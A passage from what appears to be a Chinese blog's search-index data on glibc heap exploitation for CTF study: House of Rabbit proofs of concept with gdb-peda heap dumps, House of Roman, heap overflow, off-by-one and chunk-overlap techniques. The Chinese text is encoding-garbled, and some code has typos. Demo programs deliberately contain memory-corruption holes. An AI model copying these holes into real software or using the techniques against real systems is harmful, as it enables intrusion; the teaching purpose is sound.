nowgdb-peda$ telescope 0x602000 1000000| 0x602000 --&gt; 0x0 0008| 0x602008 --&gt; 0xa1 0016| 0x602010 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)0024| 0x602018 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)0032| 0x602020 --&gt; 0x0 .....0080| 0x602050 --&gt; 0x0 0088| 0x602058 --&gt; 0x51 ('Q')0096| 0x602060 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)0104| 0x602068 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)0112| 0x602070 --&gt; 0x0 0120| 0x602078 --&gt; 0x0 ....0152| 0x602098 --&gt; 0x0 0160| 0x6020a0 --&gt; 0xa0 0168| 0x6020a8 --&gt; 0x20 (' ')gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0 top: 0x603450 (size : 0x1fbb0) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x050) smallbin[ 3]: 0x602050(0x0a0) smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )*/ POC 2: modify FD pointer unsigned long* chunk1=malloc(0x40); //0x602000unsigned long* chunk2=malloc(0x100);//0x602050chunk2[1]=0x31; //fake chunk size 0x30chunk2[7]=0x21 //fake chunk's next chunkchunk2[11]=0x21 //fake chunk's next chunk's next chuck/* Heap laylout0000| 0x602000 --&gt; 0x0 0008| 0x602008 --&gt; 0x51 ('Q')0016| 0x602010 --&gt; 0x0 ......0080| 0x602050 --&gt; 0x0 0088| 0x602058 --&gt; 0x111 0096| 0x602060 --&gt; 0x0 0104| 0x602068 --&gt; 0x31 ('1')0112| 0x602070 --&gt; 0x0 ......0144| 0x602090 --&gt; 0x0 0152| 0x602098 --&gt; 0x21 ('!')0160| 0x6020a0 --&gt; 0x0 0168| 0x6020a8 --&gt; 0x0 0176| 0x6020b0 --&gt; 0x0 0184| 0x6020b8 --&gt; 0x21 ('!')0192| 0x6020c0 --&gt; 0x0 ......0352| 0x602160 --&gt; 0x0 0360| 0x602168 --&gt; 0x20ea1*/free(chunk1);chuck1[0]=0x602060;// modify the fd of chunk1/*gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x602000 --&gt; 0x602060 (size error (0x30)) --&gt; 0x0*/malloc(5000);// malloc a big chunk to trigger malloc consolidate/*gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0 top: 0x6034f0 (size : 0x1fb10) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x050) smallbin[ 3]: 0x602000(0x030) smallbin[ 1]: 0x602060*/ åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡ä¿®æ”¹ fastbin chunk çš„ size(å¦‚ä¸Šé¢çš„ POC 1 æ‰€ç¤º) ç›´æ¥æ„é€  overlap chunkï¼Œæˆ–è€…ä¿®æ”¹ fd(å¦‚é¢çš„ POC 2 æ‰€ç¤º)ï¼Œè®©å®ƒæŒ‡å‘ä¸€ä¸ª fake chunkï¼Œè§¦å‘ malloc consolidate ä¹‹åè®©è¿™ä¸ª fake chunk æˆä¸ºä¸€ä¸ªåˆæ³•çš„ chunkã€‚ æ€»ç»“House of rabbit çš„ä¼˜ç‚¹æ˜¯å®¹æ˜“æ„é€  overlap chunkï¼Œç”±äºå¯ä»¥åŸºäº fastbin attackï¼Œç”šè‡³ä¸éœ€è¦ leak å°±å¯ä»¥å®Œæˆæ”»å‡»ã€‚å¤§å®¶å¯ä»¥é€šè¿‡ä¾‹é¢˜çš„ç»ƒä¹ åŠ æ·±å¯¹è¿™ä¸ªæ”»å‡»çš„ç†è§£ã€‚ ä¾‹é¢˜ HITB-GSEC-XCTF 2018 mutepig House of RomanHouse of Roman è¿™ä¸ªæŠ€å·§è¯´ç®€å•ç‚¹å…¶å®å°±æ˜¯ fastbin attack å’Œ Unsortbin attack ç»“åˆçš„ä¸€ä¸ªå° trickã€‚ æ¦‚æ‹¬è¯¥æŠ€æœ¯ç”¨äº bypass ALSRï¼Œåˆ©ç”¨ 12-bit çš„çˆ†ç ´æ¥è¾¾åˆ°è·å– shell çš„ç›®çš„ã€‚ä¸”ä»…ä»…åªéœ€è¦ä¸€ä¸ª UAF æ¼æ´ä»¥åŠèƒ½åˆ›å»ºä»»æ„å¤§å°çš„ chunk çš„æƒ…å†µä¸‹å°±èƒ½å®Œæˆåˆ©ç”¨ã€‚","link":"/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Housese_Of_XXX/"},{"title":"å †æº¢å‡ºåŸºç¡€","text":"å †æº¢å‡ºæ˜¯æŒ‡ç¨‹åºå‘æŸä¸ªå †å—ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«å¯ä½¿ç”¨çš„å­—èŠ‚æ•°ï¼ˆä¹‹æ‰€ä»¥æ˜¯å¯ä½¿ç”¨è€Œä¸æ˜¯ç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œæ˜¯å› ä¸ºå †ç®¡ç†å™¨ä¼šå¯¹ç”¨æˆ·æ‰€ç”³è¯·çš„å­—èŠ‚æ•°è¿›è¡Œè°ƒæ•´ï¼Œè¿™ä¹Ÿå¯¼è‡´å¯åˆ©ç”¨çš„å­—èŠ‚æ•°éƒ½ä¸å°äºç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°ï¼‰ï¼Œå› è€Œå¯¼è‡´äº†æ•°æ®æº¢å‡ºï¼Œå¹¶è¦†ç›–åˆ°ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ä¸‹ä¸€ä¸ªå †å—ã€‚å †æº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿å¾—ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿å¾—æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚ ä¸éš¾å‘ç°ï¼Œå †æº¢å‡ºæ¼æ´å‘ç”Ÿçš„åŸºæœ¬å‰ææ˜¯ï¼š ç¨‹åºå‘å †ä¸Šå†™å…¥æ•°æ®; å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚ ä¸æ ˆæº¢å‡ºæ‰€ä¸åŒçš„æ˜¯ï¼Œå †ä¸Šå¹¶ä¸å­˜åœ¨è¿”å›åœ°å€ç­‰å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥æ§åˆ¶æ‰§è¡Œæµç¨‹çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬ä¸€èˆ¬æ— æ³•ç›´æ¥é€šè¿‡å †æº¢å‡ºæ¥æ§åˆ¶EIPï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åˆ©ç”¨å †æº¢å‡ºçš„ç­–ç•¥å¦‚ä¸‹ï¼š 1ã€è¦†ç›–ä¸å…¶ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk çš„å¦‚ä¸‹å†…å®¹ï¼š prev_size sizeï¼Œä¸»è¦æœ‰ä¸‰ä¸ªæ¯”ç‰¹ä½ï¼Œä»¥åŠè¯¥å †å—çœŸæ­£çš„å¤§å°ï¼šNON_MAIN_ARENAã€IS_MAPPEDã€PREV_INUSEã€the True chunk size chunk contentï¼Œä»è€Œæ”¹å˜ç¨‹åºå›ºæœ‰çš„æ‰§è¡Œæµã€‚ 2ã€åˆ©ç”¨å †ä¸­çš„æœºåˆ¶ï¼ˆå¦‚unlinkç­‰ ï¼‰æ¥å®ç°ä»»æ„åœ°å€å†™å…¥ï¼ˆWrite-Anything-Anywhereï¼‰æˆ–æ§åˆ¶å †å—ä¸­çš„å†…å®¹ç­‰æ•ˆæœï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµã€‚ å…³é”®æ­¥éª¤å †æº¢å‡ºä¸­æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ­¥éª¤å¦‚ä¸‹ï¼š å¯»æ‰¾å †åˆ†é…å‡½æ•°é€šå¸¸æ¥è¯´å †æ˜¯é€šè¿‡è°ƒç”¨glibcå‡½æ•°mallocè¿›è¡Œåˆ†é…çš„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¼šä½¿ç”¨callocåˆ†é…ã€‚callocä¸mallocçš„åŒºåˆ«æ˜¯ calloc åœ¨åˆ†é…åä¼šè‡ªåŠ¨è¿›è¡Œæ¸…ç©ºï¼Œè¿™å¯¹äºæŸäº›ä¿¡æ¯æ³„éœ²æ¼æ´çš„åˆ©ç”¨æ¥è¯´æ˜¯è‡´å‘½çš„ã€‚ calloc(0x20);//ç­‰åŒäºptr=malloc(0x20);memset(ptr,0,0x20); é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§åˆ†é…æ˜¯ç»ç”±reallocè¿›è¡Œçš„ï¼Œreallocå‡½æ•°å¯ä»¥èº«å…¼mallocå’Œfreeä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ã€‚ #include &lt;stdio.h&gt;int main(void) { char *chunk,*chunk1; chunk=malloc(16); chunk1=realloc(chunk,32); return 0;} reallocçš„æ“ä½œå¹¶ä¸æ˜¯åƒå­—é¢æ„ä¹‰ä¸Šé‚£ä¹ˆç®€å•ï¼Œå…¶å†…éƒ¨ä¼šæ ¹æ®ä¸åŒçš„æƒ…å†µè¿›è¡Œä¸åŒæ“ä½œï¼š 1ã€å½“ realloc(ptr,size) çš„ size ä¸ç­‰äº ptr çš„ size æ—¶ï¼š å¦‚æœç”³è¯· size &gt; åŸæ¥sizeï¼š å¦‚æœ chunk ä¸ top chunk ç›¸é‚»ï¼Œç›´æ¥æ‰©å±•è¿™ä¸ª chunk åˆ°æ–° size å¤§å°ï¼› å¦‚æœ chunk ä¸ top chunk ä¸ç›¸é‚»ï¼Œç›¸å½“äº free(ptr),malloc(new_size)ã€‚ å¦‚æœç”³è¯· size &lt; åŸæ¥ sizeï¼š å¦‚æœç›¸å·®ä¸è¶³ä»¥å®¹å¾—ä¸‹ä¸€ä¸ªæœ€å° chunk(64 ä½ä¸‹ 32 ä¸ªå­—èŠ‚ï¼Œ32 ä½ä¸‹ 16 ä¸ªå­—èŠ‚)ï¼Œåˆ™ä¿æŒä¸å˜ï¼› å¦‚æœç›¸å·®å¯ä»¥å®¹å¾—ä¸‹ä¸€ä¸ªæœ€å° chunkï¼Œåˆ™åˆ‡å‰²åŸ chunk ä¸ºä¸¤éƒ¨åˆ†ï¼Œfree æ‰åä¸€éƒ¨åˆ†ã€‚ 2ã€å½“ realloc(ptr,size) çš„ size ç­‰äº 0 æ—¶ï¼Œç›¸å½“äº free(ptr)ï¼› 3ã€å½“ realloc(ptr,size) çš„ size ç­‰äº ptr çš„ sizeï¼Œä¸è¿›è¡Œä»»ä½•æ“ä½œã€‚ å¯»æ‰¾å±é™©å‡½æ•°é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½æœ‰å †æº¢å‡ºï¼Œä»¥åŠæœ‰çš„è¯ï¼Œå †æº¢å‡ºçš„ä½ç½®åœ¨å“ªé‡Œã€‚å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹ï¼š è¾“å…¥ï¼š getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥ '\\x00' scanf vscanf è¾“å‡ºï¼š sprintf å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼š strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ° '\\x00' åœæ­¢ strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ° '\\x00' åœæ­¢ bcopy ç¡®å®šå¡«å……é•¿åº¦è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®¡ç®—æˆ‘ä»¬å¼€å§‹å†™å…¥çš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ä¹‹é—´çš„è·ç¦»ã€‚ ä¸€ä¸ªå¸¸è§çš„è¯¯åŒºæ˜¯ malloc çš„å‚æ•°ç­‰äºå®é™…åˆ†é…å †å—çš„å¤§å°ï¼Œä½†æ˜¯äº‹å®ä¸Šptmallocåˆ†é…å‡ºæ¥çš„å¤§å°æ˜¯å¯¹é½çš„ã€‚è¿™ä¸ªé•¿åº¦ä¸€èˆ¬æ˜¯å­—é•¿çš„ 2 å€ï¼Œæ¯”å¦‚ 32 ä½ç³»ç»Ÿæ˜¯ 8 ä¸ªå­—èŠ‚ï¼Œ64 ä½ç³»ç»Ÿæ˜¯ 16 ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯å¯¹äºä¸å¤§äº 2 å€å­—é•¿çš„è¯·æ±‚ï¼Œmalloc ä¼šç›´æ¥è¿”å› 2 å€å­—é•¿çš„å—ä¹Ÿå°±æ˜¯æœ€å° chunkï¼Œæ¯”å¦‚ 64 ä½ç³»ç»Ÿæ‰§è¡Œmalloc(0)ä¼šè¿”å›ç”¨æˆ·åŒºåŸŸä¸º 16 å­—èŠ‚çš„å—ã€‚ #include &lt;stdio.h&gt;int main(void) { char *chunk; chunk=malloc(0); puts(\"Get input:\"); gets(chunk); return 0;} å †å†…å­˜ç»“æ„å¦‚ä¸‹ï¼š //æ ¹æ®ç³»ç»Ÿçš„ä½æ•°ï¼Œmallocä¼šåˆ†é…8æˆ–16å­—èŠ‚çš„ç”¨æˆ·ç©ºé—´0x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe10x602030: 0x0000000000000000 0x0000000000000000 æ³¨æ„ï¼šchunk_hear.size = ç”¨æˆ·åŒºåŸŸå¤§å° + 2 * å­—é•¿ è¿˜æœ‰ä¸€ç‚¹æ˜¯ä¹‹å‰æ‰€è¯´çš„ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ä¼šè¢«ä¿®æ”¹ï¼Œå…¶æœ‰å¯èƒ½ä¼šä½¿ç”¨ä¸å…¶ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk çš„prev_sizeå­—æ®µå‚¨å­˜å†…å®¹ã€‚å›å¤´å†æ¥çœ‹ä¸‹ä¹‹å‰çš„ç¤ºä¾‹ä»£ç ï¼š #include &lt;stdio.h&gt;int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0;} è§‚å¯Ÿå¦‚ä¸Šä»£ç ï¼Œæˆ‘ä»¬ç”³è¯·çš„ chunk å¤§å°æ˜¯24ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯æˆ‘ä»¬å°†å…¶ç¼–è¯‘ä¸º 64 ä½å¯æ‰§è¡Œç¨‹åºæ—¶ï¼Œå®é™…ä¸Šåˆ†é…çš„å†…å­˜ä¼šæ˜¯ 16 ä¸ªå­—èŠ‚è€Œä¸æ˜¯ 24 ä¸ªï¼š 0x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe1 16 ä¸ªå­—èŠ‚çš„ç©ºé—´æ˜¯å¦‚ä½•è£…å¾—ä¸‹ 24 ä¸ªå­—èŠ‚çš„å†…å®¹å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å€Ÿç”¨äº†ä¸‹ä¸€ä¸ªå—çš„prev_sizeåŸŸã€‚æˆ‘ä»¬å¯æ¥çœ‹ä¸€ä¸‹ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ä¸ glibc ä¸­å®é™…åˆ†é…çš„å†…å­˜å¤§å°ä¹‹é—´çš„è½¬æ¢ï¼š /* pad request bytes into a usable size -- internal version *///MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) å½“req=24æ—¶ï¼Œrequest2size(24)=32ã€‚è€Œé™¤å» chunk å¤´éƒ¨çš„ 16 ä¸ªå­—èŠ‚ã€‚å®é™…ä¸Šç”¨æˆ·å¯ç”¨ chunk çš„å­—èŠ‚æ•°ä¸º 16ã€‚è€Œæ ¹æ®æˆ‘ä»¬å‰é¢å­¦åˆ°çš„çŸ¥è¯†å¯ä»¥çŸ¥é“ chunk çš„ prev_size ä»…å½“å®ƒçš„å‰ä¸€å—å¤„äºé‡Šæ”¾çŠ¶æ€æ—¶æ‰èµ·ä½œç”¨ã€‚æ‰€ä»¥ç”¨æˆ·è¿™æ—¶å€™å…¶å®è¿˜å¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ª chunk çš„ prev_size å­—æ®µï¼Œæ­£å¥½ 24 ä¸ªå­—èŠ‚ã€‚å®é™…ä¸Š ptmalloc åˆ†é…å†…å­˜æ˜¯ä»¥åŒå­—ä¸ºåŸºæœ¬å•ä½ï¼Œä»¥ 64 ä½ç³»ç»Ÿä¸ºä¾‹ï¼Œåˆ†é…å‡ºæ¥çš„ç©ºé—´æ˜¯ 16 çš„æ•´æ•°å€ï¼Œå³ç”¨æˆ·ç”³è¯·çš„ chunk éƒ½æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ã€‚ å †ä¸­çš„ç»å…¸æ¼æ´åŠåˆ©ç”¨å †åŒæ ˆä¸€æ ·ï¼Œå­˜åœ¨è®¸å¤šç»å…¸çš„æ¼æ´åˆ©ç”¨æ–¹å¼ï¼Œä¸‹é¢å¯¹å…¸å‹çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯è¿›è¡Œå­¦ä¹ è®°å½•ã€‚ Off-By-Oneä¸¥æ ¼æ¥è¯´off-by-oneæ¼æ´æ˜¯ä¸€ç§ç‰¹æ®Šçš„æº¢å‡ºæ¼æ´ï¼Œoff-by-one æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚ã€‚ æ¼æ´åŸç†off-by-one æ˜¯æŒ‡å•å­—èŠ‚ç¼“å†²åŒºæº¢å‡ºï¼Œè¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å†™å…¥çš„ size æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µã€‚å…¶ä¸­è¾¹ç•ŒéªŒè¯ä¸ä¸¥é€šå¸¸åŒ…æ‹¬ï¼š ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †å—ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯çš„æ¬¡æ•°è®¾ç½®é”™è¯¯å¯¼è‡´å¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚ï¼› å­—ç¬¦ä¸²æ“ä½œä¸åˆé€‚ï¼ˆæ¯”å¦‚strlen()å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦æ—¶ä¸è€ƒè™‘ç»“æŸç¬¦\\x00ï¼Œè€Œstrcpy()å‡½æ•°åœ¨å¤åˆ¶çš„æ—¶å€™ä¼šå¤åˆ¶\\x00ï¼ŒäºŒè€…ä¸€èµ·ç”¨å°±ä¼šå¯¼è‡´off-by-oneï¼‰ã€‚ å•å­—èŠ‚æº¢å‡ºè¢«è®¤ä¸ºæ˜¯éš¾ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯å› ä¸º Linux çš„å †ç®¡ç†æœºåˆ¶ptmallocéªŒè¯çš„æ¾æ•£æ€§ï¼ŒåŸºäº Linux å †çš„ off-by-one æ¼æ´åˆ©ç”¨èµ·æ¥å¹¶ä¸å¤æ‚ï¼Œå¹¶ä¸”å¨åŠ›å¼ºå¤§ã€‚æ­¤å¤–ï¼Œéœ€è¦è¯´æ˜çš„ä¸€ç‚¹æ˜¯off-by-oneæ˜¯å¯ä»¥åŸºäºå„ç§ç¼“å†²åŒºçš„ï¼Œæ¯”å¦‚æ ˆã€bss æ®µç­‰ç­‰ï¼Œä½†æ˜¯å †ä¸Šçš„ off-by-one æ˜¯ CTF ä¸­æ¯”è¾ƒå¸¸è§çš„ã€‚æˆ‘ä»¬è¿™é‡Œä»…è®¨è®ºå †ä¸Šçš„ off-by-one æƒ…å†µã€‚ åˆ©ç”¨æ€è·¯1ã€æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚ä¹Ÿå¯ä½¿ç”¨ NULL å­—èŠ‚æº¢å‡ºçš„æ–¹æ³•ï¼› 2ã€æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šåœ¨ size ä¸º256çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾— prev_in_use ä½ï¼ˆè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ï¼‰è¢«æ¸…ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚ï¼ˆ1ï¼‰ è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•ï¼ˆè§ unlink éƒ¨åˆ†ï¼‰è¿›è¡Œå¤„ç†;ï¼ˆ2ï¼‰ å¦å¤–ï¼Œè¿™æ—¶ prev_size åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€  prev_size ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§ prev_size æ‰¾åˆ°çš„å—çš„å¤§å°ä¸prev_size æ˜¯å¦ä¸€è‡´ã€‚ æœ€æ–°ç‰ˆæœ¬ä»£ç ä¸­ï¼Œå·²åŠ å…¥é’ˆå¯¹ 2 ä¸­åä¸€ç§æ–¹æ³•çš„ check ï¼Œä½†æ˜¯åœ¨ 2.28 å‰å¹¶æ²¡æœ‰è¯¥ check ï¼š /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); /* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */ if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); } Chunk Extend and Overlappingchunk extendæ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡extendå¯ä»¥å®ç°chunk overlappingçš„æ•ˆæœã€‚è¿™ç§åˆ©ç”¨æ–¹æ³•éœ€è¦ä»¥ä¸‹çš„æ—¶æœºå’Œæ¡ä»¶ï¼š ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´ æ¼æ´å¯ä»¥æ§åˆ¶chunk headerä¸­çš„æ•°æ® æ¼æ´åŸç†chunk extend æŠ€æœ¯èƒ½å¤Ÿäº§ç”Ÿçš„åŸå› åœ¨äº ptmalloc åœ¨å¯¹å † chunk è¿›è¡Œæ“ä½œæ—¶ä½¿ç”¨çš„å„ç§å®ã€‚ 1ã€åœ¨ ptmalloc ä¸­ï¼Œè·å– chunk å—å¤§å°çš„æ“ä½œå¦‚ä¸‹ï¼Œä¸€ç§æ˜¯ç›´æ¥è·å– chunk çš„å¤§å°ï¼Œä¸å¿½ç•¥æ©ç éƒ¨åˆ†ï¼Œå¦å¤–ä¸€ç§æ˜¯å¿½ç•¥æ©ç éƒ¨åˆ†ï¼š /* Like chunksize, but do not mask SIZE_BITS. */#define chunksize_nomask(p) ((p)-&gt;mchunk_size)/* Get size, ignoring use bits */#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS)) 2ã€åœ¨ ptmalloc ä¸­ï¼Œè·å–ä¸‹ä¸€ chunk å—åœ°å€çš„æ“ä½œå¦‚ä¸‹ï¼š /* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) å³ä½¿ç”¨å½“å‰å—æŒ‡é’ˆåŠ ä¸Šå½“å‰å—å¤§å°ã€‚ 3ã€åœ¨ ptmalloc ä¸­ï¼Œè·å–å‰ä¸€ä¸ª chunk ä¿¡æ¯çš„æ“ä½œå¦‚ä¸‹ï¼š /* Size of the chunk below P. Only valid if prev_inuse (P). */#define prev_size(p) ((p)-&gt;mchunk_prev_size)/* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) å³é€šè¿‡ malloc_chunk-&gt;prev_size è·å–å‰ä¸€å—å¤§å°ï¼Œç„¶åä½¿ç”¨æœ¬ chunk åœ°å€å‡å»æ‰€å¾—å¤§å°ã€‚ 4ã€åœ¨ ptmallocï¼Œåˆ¤æ–­å½“å‰ chunk æ˜¯å¦æ˜¯ use çŠ¶æ€çš„æ“ä½œå¦‚ä¸‹ï¼š #define inuse(p) ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE) å³æŸ¥çœ‹ä¸‹ä¸€ chunk çš„ prev_inuse åŸŸï¼Œè€Œä¸‹ä¸€å—åœ°å€åˆå¦‚æˆ‘ä»¬å‰é¢æ‰€è¿°æ˜¯æ ¹æ®å½“å‰ chunk çš„ size è®¡ç®—å¾—å‡ºçš„ã€‚ é€šè¿‡ä¸Šé¢å‡ ä¸ªå®å¯ä»¥çœ‹å‡ºï¼Œptmalloc é€šè¿‡ chunk header çš„æ•°æ®åˆ¤æ–­ chunk çš„ä½¿ç”¨æƒ…å†µå’Œå¯¹ chunk çš„å‰åå—è¿›è¡Œå®šä½ã€‚ç®€è€Œè¨€ä¹‹ï¼Œchunk extend å°±æ˜¯é€šè¿‡æ§åˆ¶ size å’Œ pre_size åŸŸæ¥å®ç°è·¨è¶Šå—æ“ä½œä»è€Œå¯¼è‡´ overlapping çš„ã€‚ä¸ chunk extend ç±»ä¼¼çš„è¿˜æœ‰ä¸€ç§ç§°ä¸º chunk shrink çš„æ“ä½œã€‚ ä¸‹é¢ä»‹ç»å„ç±»å‹çš„ extendï¼Œå‚è€ƒçš„ç¯å¢ƒæ˜¯ 64 ä½çš„ï¼Œå› æ­¤åç§»æ˜¯ 8 å­—èŠ‚ã€‚ ç±»å‹1-å¯¹ inuse çš„ fastbin è¿›è¡Œ extendè¯¥åˆ©ç”¨çš„æ•ˆæœæ˜¯é€šè¿‡æ›´æ”¹ç¬¬ä¸€ä¸ªå—çš„å¤§å°æ¥æ§åˆ¶ç¬¬äºŒä¸ªå—çš„å†…å®¹ã€‚ç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š int main(void){ void *ptr,*ptr1; ptr=malloc(0x10);//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk malloc(0x10);//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk *(long long *)((long long)ptr-0x8)=0x41;// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ free(ptr); ptr1=malloc(0x30);// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹ return 0;} å½“ä¸¤ä¸ª malloc è¯­å¥æ‰§è¡Œä¹‹åï¼Œå †çš„å†…å­˜åˆ†å¸ƒå¦‚ä¸‹ï¼š 